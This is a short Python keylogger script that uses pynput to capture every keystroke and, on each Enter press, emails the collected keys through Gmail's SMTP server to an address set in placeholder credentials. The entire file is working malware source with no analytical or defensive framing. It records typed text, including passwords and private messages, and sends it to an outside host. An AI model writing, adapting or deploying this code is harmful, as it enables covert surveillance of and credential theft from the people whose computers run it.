import os,datetime,smtplib,ssl
from pynput.keyboard import Listener
import sys

def send_mail(keys):
    port = 465
    smtp_server = "smtp.gmail.com"
    sender_mail = "youremail@gmail.com"
    password = "yourpassword"
    receiver_mail = "youremail@gmail.com"

    message = ""
    for word in keys:
        if word == "Key.space": message+= " "
        elif word == "Key.enter": message+= ""
        else: message+=word

    if message:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server,port,context=context) as server:
            server.login(sender_mail,password)
            server.sendmail(sender_mail,receiver_mail,message)

def on_press(key):
    global filename,keys,off,finish
    letra = str(key).replace("'","",2)
    keys.append(letra)
    if  off == 0:
        finish = datetime.datetime.now() + datetime.timedelta(seconds=15)
        off = 1
    if finish <= datetime.datetime.now(): sys.exit()
    if str(key) == "Key.enter" and len(keys):
        send_mail(keys)
        keys.clear()

pwd = os.getcwd()
dateAndTime = datetime.datetime.now().strftime("%Y-%m-%d:%H:%M:%S")
filename = pwd+"/log"+dateAndTime+".txt"
keys = []
off = 0

if __name__ == '__main__':
    with Listener(on_press=on_press) as listener:
        listener.join()